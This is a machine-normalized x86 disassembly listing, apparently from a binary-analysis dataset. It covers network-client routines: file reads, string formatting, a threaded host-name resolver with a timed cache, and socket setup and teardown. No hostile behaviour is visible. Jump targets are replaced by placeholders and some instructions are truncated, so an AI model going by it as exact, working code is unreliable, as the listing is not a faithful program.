push rw-data
call sub_40a820
add esp 0x8
test eax eax
je r-xdata
test al 0x10
je r-xdata
mov ecx [ ebp + 0xc ]
push rw-data
push ecx
call [ fopen@IAT ]
add esp 0x8
mov esi eax
mov esi [ _iob@IAT ]
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x18 ]
mov ecx [ ebx + 0x14 ]
push eax
jmp r-xdata
mov edx [ esp + 0x1c ]
push edx
call sub_404780
mov eax [ esp + 0x18 ]
push eax
call [ free@IAT ]
mov ecx [ esp + 0x42c ]
add esp 0x8
mov eax 0x1a
pop edi
pop esi
pop ebp
mov [ ecx ] 0x0
pop ebx
add esp 0x410
retn
push esi
push 0x400
lea edx [ esp + 0x28 ]
push 0x1
push edx
call [ fread@IAT ]
add esp 0x10
test eax eax
je r-xdata
test esi esi
je r-xdata
mov ebp [ ebp + 0x24 ]
test ebp ebp
jne r-xdata
lea edx [ esp + 0x14 ]
push ecx
push edx
call sub_404b40
add esp 0xc
add edi eax
jmp r-xdata
cmp esi [ _iob@IAT ]
je r-xdata
push eax
lea eax [ esp + 0x24 ]
lea ecx [ esp + 0x14 ]
push eax
push ecx
call sub_404b40
push esi
push 0x400
lea edx [ esp + 0x34 ]
push 0x1
push edx
add edi eax
call [ fread@IAT ]
add esp 0x1c
test eax eax
jne r-xdata
mov eax [ ebx + 0x24 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x24 ]
test eax eax
je r-xdata
push esi
call [ fclose@IAT ]
add esp 0x4
mov ebx [ ebx ]
mov esi [ esp + 0x14 ]
test ebx ebx
jne r-xdata
mov esi [ esp + 0x18 ]
lea eax [ esp + 0x10 ]
push esi
push rw-data
push eax
call sub_404bc0
push esi
add edi eax
call [ free@IAT ]
add esp 0x10
test edi edi
je r-xdata
push esi
lea ecx [ esp + 0x14 ]
push rw-data
push ecx
call sub_404bc0
mov edx eax
mov eax [ esp + 0x438 ]
add edx edi
push esi
mov [ eax ] edx
mov [ eax + 0x4 ] 0x0
call [ free@IAT ]
mov ecx [ esp + 0x434 ]
mov eax [ esp + 0x2c ]
add esp 0x10
mov [ ecx ] eax
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x410
retn
sub_404b40
push ebx
push ebp
push esi
mov esi [ malloc@IAT ]
push edi
push 0xc
call esi
mov ebx [ esp + 0x20 ]
mov ebp eax
add esp 0x4
test ebx ebx
mov [ ebp ] 0x0
jne r-xdata
lea eax [ ebx + 0x1 ]
push eax
call esi
mov esi [ esp + 0x1c ]
mov ecx ebx
mov edx ecx
mov edi eax
shr ecx 0x2
mov [ ebp + 0x4 ] eax
add esp 0x4
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp + 0x4 ]
mov ecx [ esp + 0x14 ]
mov [ ebp + 0x8 ] ebx
mov [ eax + ebx ] 0x0
mov eax [ ecx ]
test eax eax
je r-xdata
mov edi [ esp + 0x18 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov ebx ecx
pop edi
mov [ ecx ] ebp
pop esi
mov eax ebx
pop ebp
pop ebx
retn
mov [ eax ] ebp
sub_404bc0
mov eax 0x1000
call sub_40d1d0
mov ecx [ esp + 0x1008 ]
lea eax [ esp + 0x100c ]
push eax
lea edx [ esp + 0x4 ]
push ecx
push edx
call [ vsprintf@IAT ]
mov ecx [ esp + 0x1010 ]
lea eax [ esp + 0xc ]
push 0x0
push eax
push ecx
call sub_404b40
add esp 0x1018
retn
sub_404c20
mov edx [ esp + 0x10 ]
push ebx
mov ebx [ esp + 0xc ]
push ebp
mov ecx [ edx ]
imul ebx [ esp + 0x14 ]
xor eax eax
push esi
test ecx ecx
push edi
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov edi [ edx + 0x4 ]
sub ecx edi
cmp ecx ebx
ja r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
mov esi [ edx ]
mov edi [ edx + 0x4 ]
mov ecx ebx
mov esi [ esi + 0x4 ]
sub ecx eax
add esi edi
mov edi [ esp + 0x14 ]
mov ebp ecx
add edi eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
mov ecx ebx
sub ecx eax
mov eax [ edx + 0x4 ]
add eax ecx
mov [ edx + 0x4 ] eax
mov eax ebx
mov esi [ edx ]
mov edi [ edx + 0x4 ]
mov ecx [ esi + 0x8 ]
mov esi [ esi + 0x4 ]
sub ecx edi
add esi edi
mov edi [ esp + 0x14 ]
mov ebp ecx
add edi eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ edx ]
mov ebp [ edx + 0x4 ]
mov esi [ ecx + 0x8 ]
mov [ edx + 0x4 ] 0x0
mov ecx [ ecx ]
sub esi ebp
add eax esi
mov [ edx ] ecx
test ecx ecx
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
mov edi [ ecx + 0x8 ]
mov esi ebx
sub esi eax
cmp edi esi
jbe r-xdata
sub_404cd0
mov edx [ esp + 0x4 ]
mov ecx [ edx ]
test ecx ecx
jne r-xdata
mov eax [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
push esi
mov esi [ esp + 0xc ]
mov [ esi ] ecx
mov ecx [ edx ]
pop esi
mov ecx [ ecx ]
mov [ edx ] ecx
retn
xor eax eax
retn
sub_404d10
push esi
mov esi [ esp + 0x8 ]
cmp [ esi + 0x140 ] 0xffffffff
je r-xdata
pop esi
retn
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea eax [ esp + 0x8 ]
push eax
call [ time@IAT ]
mov ecx [ esp + 0xc ]
mov edx [ esi + 0x140 ]
mov eax [ esi ]
push ecx
push edx
push eax
call sub_404d70
mov eax [ esi + 0x4 ]
add esp 0x10
test eax eax
je r-xdata
push 0x2
push 0x3
push esi
call sub_40a910
add esp 0xc
push 0x3
push esi
call sub_40a960
add esp 0x8
sub_404d70
sub esp 0x8
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
lea edx [ esp ]
push sub_404da0
push edx
push eax
mov [ esp + 0x10 ] ecx
call sub_409010
add esp 0x14
retn
sub_404da0
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
push esi
mov edx [ eax + 0x4 ]
mov esi [ ecx + 0x4 ]
sub edx esi
mov esi [ eax ]
cmp edx esi
pop esi
jl r-xdata
xor eax eax
retn
mov eax [ ecx + 0x8 ]
test eax eax
jne r-xdata
mov eax 0x1
retn
sub_404dd0
sub esp 0x8
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x18 ]
push ebx
mov ebx [ esp + 0x18 ]
push ebp
mov ebp [ esp + 0x18 ]
push esi
mov esi [ eax ]
lea edx [ esp + 0x20 ]
push edi
push edx
push ebx
push ebp
mov [ esp + 0x1c ] 0x0
mov [ esp + 0x20 ] 0xffffffff
mov [ ecx ] 0x0
call sub_404f40
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x8
retn
mov eax [ esp + 0x24 ]
mov ecx [ esi ]
inc eax
push eax
push edi
push ecx
call sub_408f70
mov [ esp + 0x1c ] eax
mov eax [ esi + 0x4 ]
add esp 0xc
test eax eax
je r-xdata
push 0x2
push 0x3
push esi
call sub_40a910
add esp 0xc
push edi
call [ free@IAT ]
mov eax [ esp + 0x14 ]
add esp 0x4
test eax eax
jne r-xdata
push 0x3
push esi
call sub_40a960
add esp 0x8
inc [ eax + 0x8 ]
mov eax [ esp + 0x1c ]
lea edx [ esp + 0x20 ]
push edx
push ebx
push ebp
push eax
call sub_4050f0
mov edi eax
add esp 0x10
test edi edi
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esp + 0x20 ]
test eax eax
je r-xdata
push ebx
push ebp
push edi
push esi
call sub_404fc0
mov [ esp + 0x20 ] eax
mov eax [ esi + 0x4 ]
add esp 0x10
test eax eax
je r-xdata
push 0x2
push 0x3
push esi
call sub_40a910
add esp 0xc
mov ecx [ esp + 0x28 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
pop edi
pop esi
pop ebp
mov [ ecx ] edx
pop ebx
add esp 0x8
retn
mov edx [ esp + 0x1c ]
lea ecx [ esp + 0x10 ]
push ecx
push edx
call sub_405710
add esp 0x8
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
test eax eax
jne r-xdata
push 0x3
push esi
call sub_40a960
add esp 0x8
mov ecx [ esp + 0x10 ]
xor eax eax
test ecx ecx
sete al
mov [ esp + 0x14 ] eax
jmp r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x8
retn
mov [ esp + 0x14 ] 0x0
push edi
call sub_4050b0
add esp 0x4
jmp r-xdata
sub_404f40
push ebx
mov ebx [ esp + 0xc ]
push ebp
push esi
push edi
push ebx
call sub_404fa0
mov ebp [ esp + 0x18 ]
mov edx eax
mov edi ebp
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
lea eax [ edx + ecx + 0x1 ]
mov ecx [ esp + 0x20 ]
mov [ ecx ] eax
inc eax
push eax
call [ malloc@IAT ]
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
push ebx
push ebp
push rw-data
push esi
call sub_40a420
add esp 0x10
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
retn
pop edi
pop esi
pop ebp
pop ebx
retn
sub_404fa0
mov edx [ esp + 0x4 ]
xor ecx ecx
mov eax 0x66666667
inc ecx
imul edx
sar edx 0x2
mov eax edx
shr eax 0x1f
add edx eax
cmp edx 0x1
jge r-xdata
mov eax ecx
retn
sub_404fc0
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push esi
lea eax [ esp + 0x14 ]
push edi
push eax
push ecx
push edx
call sub_404f40
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
push 0xc
call [ malloc@IAT ]
add esp 0x4
test eax eax
jne r-xdata
pop edi
pop esi
retn
mov ecx [ esp + 0x10 ]
mov [ eax + 0x8 ] 0x0
mov [ eax ] ecx
mov edx [ esp + 0x18 ]
push eax
mov eax [ esp + 0x10 ]
inc edx
mov ecx [ eax ]
push edx
push edi
push ecx
call sub_408e00
mov esi eax
add esp 0x10
test esi esi
jne r-xdata
mov eax [ esp + 0x10 ]
push eax
call sub_4050b0
push edi
call [ free@IAT ]
add esp 0x8
xor eax eax
pop edi
pop esi
retn
lea edx [ esp + 0x14 ]
push edx
call [ time@IAT ]
mov edx [ esi + 0x8 ]
mov eax [ esp + 0x18 ]
inc edx
push edi
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] edx
call [ free@IAT ]
add esp 0x8
mov eax esi
pop edi
pop esi
retn
push edi
call [ free@IAT ]
add esp 0x4
xor eax eax
pop edi
pop esi
retn
sub_405070
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esp + 0xc ]
mov ecx [ eax + 0x8 ]
dec ecx
mov [ eax + 0x8 ] ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push 0x2
push 0x3
push esi
call sub_40a910
add esp 0xc
pop esi
retn
push 0x3
push esi
call sub_40a960
add esp 0x8
sub_4050f0
push ebx
mov ebx [ esp + 0x8 ]
push ebp
mov ebp [ esp + 0x18 ]
mov eax [ ebx ]
push esi
mov [ ebp ] 0x0
push edi
cmp [ eax + 0x150 ] 0x2
jne r-xdata
mov edi [ esp + 0x18 ]
push edi
call [ inet_addr@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov edx [ esp + 0x1c ]
push edx
push edi
push ebx
call sub_4053e0
add esp 0xc
test al al
je r-xdata
push 0x9c
call [ malloc@IAT ]
add esp 0x4
test eax eax
jne r-xdata
push edi
call [ gethostbyname@IAT ]
mov edi eax
test edi edi
je r-xdata
pop edi
mov [ ebp ] 0x1
pop esi
pop ebp
xor eax eax
pop ebx
retn
lea ecx [ eax + 0x10 ]
push 0x80
mov [ eax + 0xc ] ecx
lea ecx [ eax + 0x18 ]
mov edi eax
mov [ ecx ] esi
mov edx [ eax + 0xc ]
mov [ edx ] ecx
mov ecx [ eax + 0xc ]
mov [ ecx + 0x4 ] 0x0
lea ecx [ eax + 0x1c ]
push ecx
push esi
mov [ eax + 0x8 ] 0x2
mov [ eax + 0xa ] 0x4
mov [ eax ] ecx
call [ ntohl@IAT ]
push eax
call sub_4053b0
add esp 0xc
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
retn
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
retn
push 0x2328
call [ malloc@IAT ]
mov [ esp + 0x18 ] eax
lea eax [ esp + 0x18 ]
push edi
push eax
call sub_4051e0
add esp 0xc
mov edi eax
sub_4051e0
push ecx
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0xc ]
push ebx
push ebp
push esi
mov esi [ eax ]
mov ebx esi
add esi 0x10
push edi
xor eax eax
mov [ ebx ] esi
mov edx [ ecx ]
mov edi edx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov edi ecx
inc edi
push edi
push edx
push esi
call [ strncpy@IAT ]
add esi edi
mov ecx [ esp + 0x28 ]
mov edx esi
mov eax 0x8
and edx 0x7
add esp 0xc
sub eax edx
xor ebp ebp
add esi eax
mov [ ebx + 0x4 ] esi
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
test eax eax
lea esi [ esi + ebp * 4 + 0x4 ]
je r-xdata
mov edx eax
mov edx [ ebx + 0x4 ]
mov [ edx + ebp * 4 ] 0x0
mov ax [ ecx + 0x8 ]
mov [ ebx + 0x8 ] ax
mov dx [ ecx + 0xa ]
mov eax esi
mov [ ebx + 0xa ] dx
and eax 0x7
mov edx 0x8
sub edx eax
xor eax eax
add esi edx
mov [ ebx + 0xc ] esi
mov edx [ ecx + 0xc ]
mov edi [ edx ]
test edi edi
je r-xdata
mov edx [ eax ]
xor ebp ebp
test edx edx
je r-xdata
inc ebp
add edx 0x4
test eax eax
jne r-xdata
movsx ecx [ ecx + 0xa ]
lea eax [ esi + eax * 4 + 0x4 ]
mov esi edi
xor edx edx
mov [ esp + 0x10 ] ecx
test esi esi
je r-xdata
mov ebp [ edx + 0x4 ]
add edx 0x4
inc eax
test ebp ebp
jne r-xdata
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov edi ecx
inc edi
push edi
push edx
push esi
call [ strncpy@IAT ]
mov ecx [ ebx + 0x4 ]
mov edx [ esp + 0x28 ]
add esp 0xc
mov [ ecx + ebp * 4 ] esi
mov eax [ edx + 0x4 ]
add esi edi
inc ebp
mov edx [ eax + ebp * 4 ]
test edx edx
jne r-xdata
cmp [ edx ] 0x0
je r-xdata
mov ecx [ ebx + 0xc ]
mov edi [ esp + 0x18 ]
mov [ ecx + edx * 4 ] 0x0
mov ecx [ edi ]
sub eax ecx
push eax
push ecx
call [ realloc@IAT ]
mov esi eax
mov eax [ edi ]
add esp 0x8
cmp esi eax
je r-xdata
mov ebp ecx
mov edi eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebx + 0xc ]
mov esi [ esp + 0x1c ]
mov [ ecx + edx * 4 ] eax
mov ecx [ esp + 0x10 ]
mov esi [ esi + 0xc ]
add eax ecx
inc edx
mov esi [ esi + edx * 4 ]
test esi esi
jne r-xdata
mov ecx [ esp + 0x1c ]
mov [ edi ] esi
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov edx esi
sub edx eax
push edx
push esi
call sub_405350
add esp 0x8
sub_405350
mov eax [ esp + 0x4 ]
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ eax ]
mov ecx [ eax + 0x4 ]
add edi esi
test ecx ecx
mov [ eax ] edi
je r-xdata
mov ecx [ eax + 0xc ]
add ecx esi
mov [ eax + 0xc ] ecx
mov edx [ ecx ]
test edx edx
je r-xdata
add ecx esi
mov [ eax + 0x4 ] ecx
mov edx [ ecx ]
test edx edx
je r-xdata
pop edi
pop esi
retn
xor edi edi
xor edi edi
add edx esi
add edi 0x4
mov [ ecx ] edx
mov edx [ eax + 0xc ]
lea ecx [ edi + edx ]
mov edx [ edi + edx ]
test edx edx
jne r-xdata
add edx esi
add edi 0x4
mov [ ecx ] edx
mov ecx [ eax + 0x4 ]
add ecx edi
mov edx [ ecx ]
test edx edx
jne r-xdata
sub_4053b0
mov eax [ esp + 0x4 ]
push esi
push eax
call [ htonl@IAT ]
mov ecx [ esp + 0x10 ]
push ecx
push eax
call [ inet_ntoa@IAT ]
mov esi [ esp + 0x10 ]
push eax
push esi
call [ strncpy@IAT ]
add esp 0xc
mov eax esi
pop esi
retn
sub_4053e0
push ebp
push esi
push edi
push 0x1
push 0x10
call [ calloc@IAT ]
mov edi eax
add esp 0x8
test edi edi
jne r-xdata
mov esi [ esp + 0x10 ]
mov eax [ esi + 0x738 ]
lea ebp [ esi + 0x738 ]
push eax
call sub_405760
mov ecx [ esp + 0x18 ]
push ecx
call [ _strdup@IAT ]
add esp 0x8
mov [ ebp ] eax
test eax eax
jne r-xdata
push 0xc
call [ SetLastError@IAT ]
pop edi
pop esi
xor al al
pop ebp
retn
mov edx [ esp + 0x18 ]
lea eax [ edi + 0x4 ]
push eax
push 0x0
push esi
push sub_4054d0
push 0x0
mov [ esi + 0x73c ] edx
mov [ esi + 0x744 ] 0x0
mov [ esi + 0x748 ] 0x0
mov [ esi + 0x740 ] 0x0
mov [ esi + 0x74c ] edi
push 0x0
mov [ edi + 0xc ] 0xffffffff
call [ _beginthreadex@IAT ]
add esp 0x18
mov [ edi ] eax
test eax eax
jne r-xdata
push edi
call [ free@IAT ]
add esp 0x4
push 0xc
call [ SetLastError@IAT ]
pop edi
pop esi
xor al al
pop ebp
retn
push 0x0
push 0x2
push 0x2
call [ socket@IAT ]
mov [ edi + 0xc ] eax
pop edi
pop esi
mov al 0x1
pop ebp
retn
call [ _errno@IAT ]
mov ecx [ eax ]
push ecx
call [ SetLastError@IAT ]
push ebp
call sub_4055d0
add esp 0x4
xor al al
pop edi
pop esi
pop ebp
retn
sub_4054d0
push esi
mov esi [ esp + 0x8 ]
push 0x2afc
mov [ esi + 0x748 ] 0x2afc
call [ WSASetLastError@IAT ]
mov eax [ esi + 0x738 ]
push eax
call [ gethostbyname@IAT ]
test eax eax
je r-xdata
push 0x0
call [ WSAGetLastError@IAT ]
push eax
push esi
call sub_405530
add esp 0xc
xor eax eax
pop esi
retn 0x4
push eax
push 0x0
push esi
call sub_405530
add esp 0xc
mov eax 0x1
pop esi
retn 0x4
sub_405530
mov eax [ esp + 0x8 ]
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
xor edi edi
test eax eax
mov [ esi + 0x744 ] 0x1
mov [ esi + 0x748 ] eax
jne r-xdata
mov [ esi + 0x740 ] edi
pop edi
pop esi
pop ebx
retn
push 0x2328
call [ malloc@IAT ]
add esp 0x4
mov [ esp + 0x10 ] eax
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
push eax
push ecx
call sub_4051e0
mov edi [ esi ]
mov ebx eax
add esp 0x8
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov edx [ esi + 0x73c ]
mov eax [ esi + 0x738 ]
push edx
push eax
push ebx
push edi
call sub_404fc0
mov ebx eax
mov eax [ edi + 0x4 ]
add esp 0x10
test eax eax
je r-xdata
push 0x2
push 0x3
push edi
call sub_40a910
add esp 0xc
mov [ esi + 0x740 ] ebx
pop edi
pop esi
pop ebx
retn
push 0x3
push edi
call sub_40a960
add esp 0x8
sub_4055d0
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ free@IAT ]
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
push eax
call edi
add esp 0x4
mov [ esi ] 0x0
mov [ esi + 0x14 ] 0x0
pop edi
pop esi
retn
mov eax [ eax + 0xc ]
cmp eax 0xffffffff
je r-xdata
mov eax [ esi + 0x14 ]
push eax
call edi
add esp 0x4
push eax
call [ closesocket@IAT ]
sub_405620
push ebx
mov ebx [ esp + 0x8 ]
push esi
push edi
mov eax [ ebx ]
mov esi [ ebx + 0x74c ]
mov edi [ eax + 0x8c ]
test edi edi
jne r-xdata
call [ GetTickCount@IAT ]
lea eax [ edi + edi * 4 ]
mov ecx [ esi ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
shl eax 0x3
push eax
push ecx
call [ WaitForSingleObject@IAT ]
test eax eax
je r-xdata
mov eax [ eax + 0x88 ]
test eax eax
mov edi eax
jne r-xdata
mov edx [ ebx + 0x748 ]
push edx
call [ WSASetLastError@IAT ]
mov eax [ esi ]
lea edi [ esi + 0x8 ]
push edi
push eax
call [ GetExitCodeThread@IAT ]
cmp eax 0x80
je r-xdata
mov edi 0x12c
mov eax [ ebx + 0x740 ]
xor esi esi
test eax eax
jne r-xdata
mov edx [ ebx + 0x740 ]
mov [ eax ] edx
lea edi [ esi + 0x8 ]
mov [ ebx + 0x744 ] 0x1
mov [ edi ] 0xffffffff
jmp r-xdata
lea ecx [ ebx + 0x738 ]
push ecx
call sub_4055d0
add esp 0x4
test esi esi
je r-xdata
cmp [ edi ] 0xffffffff
je r-xdata
mov ecx [ esi ]
push ecx
call [ CloseHandle@IAT ]
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
push ebx
call sub_405a70
add esp 0x4
mov esi 0x1c
cmp [ ebx + 0x748 ] 0x2afc
je r-xdata
mov al [ ebx + 0x744 ]
neg al
sbb eax eax
and al 0xea
add eax 0x1c
mov esi eax
jmp r-xdata
sub_405710
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esp + 0x10 ]
mov [ edi ] 0x0
mov al [ esi + 0x744 ]
test al al
je r-xdata
pop edi
xor eax eax
pop esi
retn
lea eax [ esi + 0x738 ]
push eax
call sub_4055d0
mov esi [ esi + 0x740 ]
add esp 0x4
test esi esi
jne r-xdata
mov [ edi ] esi
pop edi
mov eax 0x6
pop esi
retn
sub_405780
push esi
mov esi [ esp + 0x8 ]
push edi
push esi
call sub_405c10
add esp 0x4
cmp eax 0xffffffff
je r-xdata
mov eax [ esi + 0x1a8 ]
test eax eax
je r-xdata
push esi
call sub_405c10
add esp 0x4
cmp eax 0xffffffff
jne r-xdata
mov eax [ esi + 0x82d4 ]
push eax
call sub_405760
mov ecx [ esi + 0x82e0 ]
push ecx
call sub_405760
mov al [ esi + 0x19c ]
mov edi [ free@IAT ]
add esp 0x8
test al al
je r-xdata
push eax
call sub_4040a0
add esp 0x4
mov al [ esi + 0x1a4 ]
test al al
je r-xdata
mov edx [ esi + 0x198 ]
push edx
call edi
add esp 0x4
mov al [ esi + 0x194 ]
test al al
je r-xdata
mov eax [ esi + 0x1a0 ]
push eax
call edi
add esp 0x4
mov edx [ esi + 0x2bc ]
push edx
call sub_405760
mov eax [ esi + 0x2b4 ]
push eax
call edi
mov ecx [ esi + 0x8330 ]
push ecx
call sub_405760
mov eax [ esi + 0x4 ]
add esp 0xc
test eax eax
je r-xdata
mov ecx [ esi + 0x190 ]
push ecx
call edi
add esp 0x4
push esi
call edi
add esp 0x4
xor eax eax
pop edi
pop esi
retn
mov edx [ eax + 0x4 ]
dec edx
mov [ eax + 0x4 ] edx
sub_405860
push ebx
mov ebx [ malloc@IAT ]
push esi
push edi
push 0x8338
call ebx
mov esi eax
add esp 0x4
test esi esi
jne r-xdata
mov ecx 0x20ce
xor eax eax
mov edi esi
push 0x100
[ edi ]
call ebx
add esp 0x4
mov [ esi + 0x2bc ] eax
test eax eax
jne r-xdata
pop edi
pop esi
mov eax 0x1b
pop ebx
retn
mov [ esi + 0x2c0 ] 0x100
mov eax [ _iob@IAT ]
add eax 0x20
mov edi [ esi + 0x1e8 ]
mov [ esi + 0x1c ] eax
mov ecx [ _iob@IAT ]
mov eax [ fwrite@IAT ]
mov [ esi + 0x20 ] ecx
mov edx [ _iob@IAT ]
mov ecx [ fread@IAT ]
mov [ esi + 0x70 ] eax
or eax 0xffffffff
mov [ esi + 0x98 ] eax
mov [ esi + 0x82c8 ] eax
mov [ esi + 0x78 ] ecx
mov [ esi + 0x9c ] eax
mov [ esi + 0x82cc ] eax
add edx 0x40
mov eax 0x1
or edi 0x10
mov ecx 0x5
push 0x14
mov [ esi + 0x8 ] edx
mov [ esi + 0xf8 ] eax
mov [ esi + 0x181 ] al
mov [ esi + 0x182 ] al
mov [ esi + 0x140 ] 0x3c
mov [ esi + 0x167 ] al
mov [ esi + 0x1e8 ] edi
mov [ esi + 0x130 ] ecx
mov [ esi + 0x18 ] 0x438
mov [ esi + 0x13c ] 0x0
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] eax
mov [ esi + 0x2b8 ] ecx
call ebx
mov edi eax
add esp 0x4
test edi edi
mov [ esi + 0x2b4 ] edi
jne r-xdata
push esi
call [ free@IAT ]
add esp 0x4
mov eax 0x1b
pop edi
pop esi
pop ebx
retn
mov ecx [ esi + 0x2b8 ]
xor eax eax
shl ecx 0x2
mov edx ecx
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov eax [ esp + 0x10 ]
pop edi
mov [ eax ] esi
pop esi
xor eax eax
pop ebx
retn
mov edx [ esi + 0x2bc ]
mov edi [ free@IAT ]
push edx
call edi
push esi
call edi
add esp 0x8
mov eax 0x1b
pop edi
pop esi
pop ebx
retn
sub_4059c0
mov eax [ esp + 0x8 ]
cmp eax 0x2728
jg r-xdata
cmp eax 0x4e2b
je r-xdata
je r-xdata
mov ecx [ esp + 0x4 ]
mov eax [ esp + 0xc ]
test eax eax
mov [ ecx + 0x70 ] eax
jne r-xdata
mov eax 0x2
retn
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test eax eax
mov [ ecx + 0xb8 ] eax
je r-xdata
sub eax 0x2711
je r-xdata
xor eax eax
retn
mov eax [ fwrite@IAT ]
mov [ ecx + 0x70 ] eax
mov [ ecx + 0xf8 ] 0x3
xor eax eax
retn
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0xc ]
xor eax eax
mov [ ecx + 0x1c ] edx
retn
dec eax
jne r-xdata
push esi
mov esi [ esp + 0x8 ]
mov al [ esi + 0x194 ]
test al al
je r-xdata
mov eax [ esp + 0x10 ]
mov [ esi + 0x195 ] 0x1
mov [ esi + 0x28 ] eax
mov [ esi + 0x190 ] eax
pop esi
xor eax eax
retn
mov eax [ esi + 0x190 ]
push eax
call [ free@IAT ]
add esp 0x4
mov [ esi + 0x194 ] 0x0
sub_405a70
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
mov al [ esi + 0x10c ]
push ebp
mov ebp [ free@IAT ]
push edi
test al al
je r-xdata
xor eax eax
pop esi
retn
mov eax [ esi + 0x620 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x88 ]
push eax
call ebp
add esp 0x4
mov [ esi + 0x10c ] 0x0
mov ecx [ esi ]
mov [ ecx + 0x82fc ] 0x0
mov eax [ esi + 0x62c ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
je r-xdata
push esi
call eax
add esp 0x4
mov eax [ esi + 0x124 ]
test eax eax
je r-xdata
mov edx [ esi + 0x16c ]
push edx
call sub_405760
mov eax [ esi + 0x168 ]
push eax
call sub_405760
mov ecx [ esi + 0x68 ]
push ecx
call sub_405760
mov edx [ esi + 0x60 ]
push edx
call sub_405760
mov eax [ esi + 0xc0 ]
mov edi [ closesocket@IAT ]
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov edx [ esi ]
mov ecx [ edx + 0x2b4 ]
mov [ ecx + eax * 4 ] 0x0
mov eax [ esi + 0xbc ]
cmp eax 0xffffffff
je r-xdata
push eax
call edi
mov eax [ esi + 0x9c ]
push eax
call sub_405760
mov ecx [ esi + 0xa0 ]
push ecx
call sub_405760
mov edx [ esi + 0xa4 ]
push edx
call sub_405760
mov eax [ esi + 0xa8 ]
push eax
call sub_405760
mov ecx [ esi + 0x144 ]
push ecx
call sub_405760
mov edx [ esi + 0x148 ]
push edx
call sub_405760
mov eax [ esi + 0x150 ]
push eax
call sub_405760
mov ecx [ esi + 0x14c ]
push ecx
call sub_405760
mov edx [ esi + 0x154 ]
push edx
call sub_405760
mov eax [ esi + 0x158 ]
push eax
call sub_405760
mov ecx [ esi + 0x15c ]
push ecx
call sub_405760
mov edx [ esi + 0x160 ]
push edx
call sub_405760
mov eax [ esi + 0x164 ]
push eax
call sub_405760
mov ecx [ esi + 0x98 ]
push ecx
call sub_405760
mov edx [ esi + 0x738 ]
push edx
call sub_405760
mov eax [ esi + 0x74c ]
push eax
call sub_405760
add esp 0x40
push esi
call ebp
add esp 0x4
xor eax eax
pop edi
pop ebp
pop esi
retn
push eax
call edi
sub_405c10
sub esp 0xc
push ebx
push ebp
push esi
or ebx 0xffffffff
push edi
mov [ esp + 0x10 ] ebx
call sub_40a9a0
mov edi [ esp + 0x20 ]
mov ebp eax
xor esi esi
mov [ esp + 0x18 ] edx
mov eax [ edi + 0x2b8 ]
test eax eax
jle r-xdata
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
add esp 0xc
retn
jmp r-xdata
